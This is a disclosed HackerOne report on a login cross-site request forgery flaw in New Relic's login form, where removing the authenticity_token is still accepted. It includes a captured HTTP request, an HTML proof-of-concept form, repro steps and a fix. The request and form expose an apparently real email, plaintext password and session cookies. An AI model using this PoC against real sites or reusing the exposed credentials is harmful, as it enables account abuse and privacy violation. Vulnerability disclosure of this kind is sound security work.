@@ -1,0 +1,63 @@
+ReportLink:https://hackerone.com/reports/114797
+WeaknessName:Cross-Site Request Forgery (CSRF)
+Reporter:https://hackerone.com/waqar_vicky
+ReportedTo:New Relic(newrelic)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:20.03.2017 1:38:01
+
+Summary:
+
+Description:
+
+POST /login?return_to=%2Foauth_provider%2Fauthorize%3Fresponse_type%3Dcode%26client_id%3D%252BvB2dkv4yOb37C00ACk%252B6A%253D%253D%26redirect_uri%3Dhttps%253A%252F%252Frpm.newrelic.com%252Fauth%252Fnewrelic%252Fcallback%26state%3D2ea541fcd18aa27925ad8977848536106cbaf1bbb4611f90 HTTP/1.1
+Host: login.newrelic.com
+User-Agent: Mozilla/5.0 (Windows NT 6.2; rv:43.0) Gecko/20100101 Firefox/43.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://login.newrelic.com/login?return_to=%2Foauth_provider%2Fauthorize%3Fresponse_type%3Dcode%26client_id%3D%252BvB2dkv4yOb37C00ACk%252B6A%253D%253D%26redirect_uri%3Dhttps%253A%252F%252Frpm.newrelic.com%252Fauth%252Fnewrelic%252Fcallback%26state%3D2ea541fcd18aa27925ad8977848536106cbaf1bbb4611f90
+Cookie: optimizelyEndUserId=oeu1454640113929r0.2632877631374001; optimizelySegments=%7B%22171941824%22%3A%22ff%22%2C%22172184284%22%3A%22false%22%2C%22172242367%22%3A%22referral%22%7D; optimizelyBuckets=%7B%7D; utag_main=_st:1454642958585$ses_id:1454640895992%3Bexp-session; __ar_v4=DLQZ5QQWIFBZZM5ECJME6X%3A20160206%3A4%7C7QCUSMLEMBHIPPEMTU6A7A%3A20160206%3A4%7CI7ZJI4CQMBCNHGOQ27AYQZ%3A20160206%3A8%7CYCNZVXZ6TJDJ3KMJRVGKFH%3A20160206%3A8; _mkto_trk=id:412-MZS-894&token:_mch-newrelic.com-1454640131108-32811; ajs_user_id=null; ajs_group_id=null; ajs_anonymous_id=%22ede39706-ab87-4fda-b43e-35719c1601fa%22; amplitude_idnewrelic.com=eyJkZXZpY2VJZCI6Ijc1ZGJmMTA1LWU1ZDEtNDRjZS1hYjU0LTU4OWI4MTU3MGFiYSIsInVzZXJJZCI6bnVsbCwib3B0T3V0IjpmYWxzZSwic2Vzc2lvbklkIjoxNDU0NjQwMTMzMTE2LCJsYXN0RXZlbnRUaW1lIjoxNDU0NjQwMTg3OTkxLCJldmVudElkIjo3LCJpZGVudGlmeUlkIjowLCJzZXF1ZW5jZU51bWJlciI6N30=; _ga=GA1.2.603378193.1454640133; _biz_uid=269a214df3fc49d5850435a032470005; _biz_sid=67a97e; _biz_nA=7; _biz_pendingA=%5B%22m%2Fblr%3Fe%3DwRqfYX8wg46dIoc%252FiFWtTXx2Z3hvHQMfG0J8kbByNJ5pebuQa5iimo%252BKwaId1rLuvtjjOtrAl1gASdmi1Wdbl0ag3SLbObsQZTnCTiAtD4NiylKT0xc8Zx80IQ%252BmVWeMpCAMs4Yy%252BZCNcZwiCf4oQz6wQmdAXEp4wDxAs1EBoXs%253D%26frm_c%3D286662619%26eventSource%3DonClick-Button%26rnd%3D31204d71890145cad1058cbe63e5ee08%26_biz_u%3D269a214df3fc49d5850435a032470005%26_biz_s%3D67a97e%26_biz_l%3Dhttps%253A%252F%252Fnewrelic.com%252Fsignup%26_biz_t%3D1454640270126%26_biz_i%3DSign%2520up%2520for%2520New%2520Relic%2520%257C%2520Application%2520Performance%2520Management%2520%257C%2520Application%2520Performance%2520Management%2520%2526%2520Devops%2520Tools%26_biz_n%3D4%22%2C%22m%2Ffrm%3Fe%3DwRqfYX8wg46dIoc%252FiFWtTXx2Z3hvHQMfG0J8kbByNJ5pebuQa5iimo%252BKwaId1rLuvtjjOtrAl1gASdmi1Wdbl0ag3SLbObsQZTnCTiAtD4NiylKT0xc8Zx80IQ%252BmVWeMpCAMs4Yy%252BZCNcZwiCf4oQz6wQmdAXEp4wDxAs1EBoXs%253D%26frm_c%3D286662619%26eventSource%3DsubmitJQ%26rnd%3D31204d71890145cad1058cbe63e5ee08%26_biz_u%3D269a214df3fc49d5850435a032470005%26_biz_s%3D67a97e%26_biz_l%3Dhttps%253A%252F%252Fnewrelic.com%252Fsignup%26_biz_t%3D1454640270243%26_biz_i%3DSign%2520up%2520for%2520New%2520Relic%2520%257C%2520Application%2520Performance%2520Management%2520%257C%2520Application%2520Performance%2520Management%2520%2526%2520Devops%2520Tools%26_biz_n%3D5%22%2C%22m%2Fblr%3Fe%3DwRqfYX8wg46dIoc%252FiFWtTXx2Z3hvHQMfG0J8kbByNJ5pebuQa5iimo%252BKwaId1rLuvtjjOtrAl1gASdmi1Wdbl0ag3SLbObsQZTnCTiAtD4NiylKT0xc8Zx80IQ%252BmVWeMpCAMs4Yy%252BZCNcZwiCf4oQz6wQmdAXEp4wDxAs1EBoXs%253D%26frm_c%3D286662619%26eventSource%3DonEnter%26rnd%3D31204d71890145cad1058cbe63e5ee08%26_biz_u%3D269a214df3fc49d5850435a032470005%26_biz_s%3D67a97e%26_biz_l%3Dhttps%253A%252F%252Fnewrelic.com%252Fsignup%26_biz_t%3D1454640279688%26_biz_i%3DSign%2520up%2520for%2520New%2520Relic%2520%257C%2520Application%2520Performance%2520Management%2520%257C%2520Application%2520Performance%2520Management%2520%2526%2520Devops%2520Tools%26_biz_n%3D6%22%5D; ei_client_id=56b40c366ca0221100e7d898; _biz_flagsA=%7B%22Version%22%3A1%2C%22Frm%22%3A%221%22%7D; _golden_gate_session=aTNBZ2dLanpaR1pzbjZ1NisxVXVvYWxTaXhKZFBNYUN6ZzdWd2tXakxKZjkxUVZ4RjNjRG1GaHY2dC96T2k1Y3o4WDVKb2V1WjlDcS9VdmFnN0daUHBnbmhWdExJaUVwMzh5dEtBVkxqR1ZVMkJBb2JqdFZwOS9XZWtVckN2K1NGTGxnUTBBN1JUOEx2aFo3TndMektVcVA5TEZUdlF4TUpFYUNwMVJuZjQ2M3N6akhaYnFYc3VpL3JjZldhUUo3NVJxc015aUdSaXZOM2RKeHJQQzI4WHl0Tkh0R1NwUGZuTWs1UXM0QUt5dE9zUk1oN3diWE1jakdCY2cyTnpSUG00aTFEQmVnSGQxV0FQQll0MlZyeUc5N24xeWNEcEFiWDEvZkhRbDVIQzA9LS1hRkEzUk12RWFJYWhEV3VjMDhYcDd3PT0%3D--98cd80ad06cc6a4378e0615b87db2bee094e7183; hit_signup_confirmation=1; _gat=1
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 459
+
+utf8=%E2%9C%93&authenticity_token=&return_to=%2Foauth_provider%2Fauthorize%3Fresponse_type%3Dcode%26client_id%3D%252BvB2dkv4yOb37C00ACk%252B6A%253D%253D%26redirect_uri%3Dhttps%253A%252F%252Frpm.newrelic.com%252Fauth%252Fnewrelic%252Fcallback%26state%3D2ea541fcd18aa27925ad8977848536106cbaf1bbb4611f90&login%5Bemail%5D=vickyvk017%40gmail.com&login%5Bpassword%5D=vicky645&login%5Bremember_me%5D=0&commit=Sign+in
+
+
+<html>
+  <body>
+    <form action="https://login.newrelic.com/login?return_to=%2Foauth_provider%2Fauthorize%3Fresponse_type%3Dcode%26client_id%3D%252BvB2dkv4yOb37C00ACk%252B6A%253D%253D%26redirect_uri%3Dhttps%253A%252F%252Frpm.newrelic.com%252Fauth%252Fnewrelic%252Fcallback%26state%3D2ea541fcd18aa27925ad8977848536106cbaf1bbb4611f90" method="POST">
+      <input type="hidden" name="utf8" value="â&#156;&#147;" />
+      <input type="hidden" name="authenticity&#95;token" value="" />
+      <input type="hidden" name="return&#95;to" value="&#47;oauth&#95;provider&#47;authorize&#63;response&#95;type&#61;code&amp;client&#95;id&#61;&#37;2BvB2dkv4yOb37C00ACk&#37;2B6A&#37;3D&#37;3D&amp;redirect&#95;uri&#61;https&#37;3A&#37;2F&#37;2Frpm&#46;newrelic&#46;com&#37;2Fauth&#37;2Fnewrelic&#37;2Fcallback&amp;state&#61;2ea541fcd18aa27925ad8977848536106cbaf1bbb4611f90" />
+      <input type="hidden" name="login&#91;email&#93;" value="vickyvk017&#64;gmail&#46;com" />
+      <input type="hidden" name="login&#91;password&#93;" value="vicky645" />
+      <input type="hidden" name="login&#91;remember&#95;me&#93;" value="0" />
+      <input type="hidden" name="commit" value="Sign&#32;in" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+
+Steps to repo:
+
+1) Access https://login.newrelic.com/login?return_to=https%3A%2F%2Frpm.newrelic.com%2Fauth%2Fnewrelic%3Forigin%3Dhttps%253A%252F%252Frpm.newrelic.com%252Faccounts%252F1233098%252Fsetup
+2) Fill Credentials
+3) Start burp
+4) Click "SUBMIT".
+5) A POST request will appear in burp. check HTTP REQUEST above.
+6) Remove the "authenticity_token=" value from request
+7) Forward the request
+8) You will log in Without validation of "authenticity_token".
+
+Verify this by checking the inbox of provided email address.
+
+FIX:
+
+Validate the value of "authenticity_token" and do not let the request go forward without it.
+
+Regards:
+Vicky
